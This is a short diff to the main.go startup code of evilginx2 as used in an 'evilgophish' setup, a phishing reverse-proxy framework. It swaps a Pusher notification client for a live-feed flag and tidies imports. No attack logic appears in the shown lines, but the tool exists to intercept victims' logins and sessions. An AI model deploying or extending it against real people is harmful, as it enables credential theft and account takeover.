@@ -1,7 +1,6 @@
 package main
 
 import (
-    "encoding/json"
     "flag"
     "io/ioutil"
     "os"
@@ -20,7 +19,7 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var gophish_db = flag.String("g", "", "Full path to gophish database")
-var pusher_client = database.Pusher{}
+var feed_enabled = flag.Bool("feed", false, "Enable live feed")
 
 func joinPath(base_path string, rel_path string) string {
     var ret string
@@ -42,16 +41,6 @@ func main() {
         log.Fatal("you need to provide the full path to the gophish database: ./evilginx2 -g /opt/evilgophish/gophish/gophish.db")
         return
     }
-    usr, _ := user.Current()
-    pusher_conf := filepath.Join(usr.HomeDir, ".evilginx/pusher.conf")
-    pusher_file, err := os.Open(pusher_conf)
-    if err != nil {
-        pusher_client.Enabled = false
-    } else {
-        bytes, _ := ioutil.ReadAll(pusher_file)
-        json.Unmarshal(bytes, &pusher_client)
-    }
-
     if *phishlets_dir == "" {
         *phishlets_dir = joinPath(exe_dir, "./phishlets")
         if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
@@ -99,7 +88,7 @@ func main() {
     config_path := *cfg_dir
     log.Info("loading configuration from: %s", config_path)
 
-    err = os.MkdirAll(*cfg_dir, os.FileMode(0700))
+    err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
     if err != nil {
         log.Fatal("%v", err)
         return
@@ -173,7 +162,7 @@ func main() {
         return
     }
 
-    hp, _ := core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, pusher_client)
+    hp, _ := core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled)
     hp.Start()
 
     t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
